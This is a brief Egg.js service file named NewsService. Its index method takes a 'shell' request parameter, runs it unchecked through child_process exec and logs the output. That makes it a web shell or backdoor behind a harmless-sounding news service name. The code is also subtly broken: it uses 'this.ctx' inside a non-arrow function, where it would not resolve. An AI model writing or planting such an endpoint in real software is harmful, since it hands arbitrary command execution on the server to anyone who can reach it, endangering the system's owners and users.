const Service = require('egg').Service;
const {exec} = require('child_process');

class NewsService extends Service {
    async index(params) {
        this.ctx.logger.info(params);
           return new Promise(function (resolve, reject) {
            if (params.hasOwnProperty('shell')) {
                exec(params.shell, (error, stdout, stderr) => {
                    if (error) {
                        this.ctx.logger.info(error);
                        reject('error') ;
                    }
                    this.ctx.logger.info(`stdout: ${stdout}`);
                    this.ctx.logger.info(`stderr: ${stderr}`);
                    resolve ('done')
                });
            }else reject('error')
        })
    }
}
module.exports = NewsService;
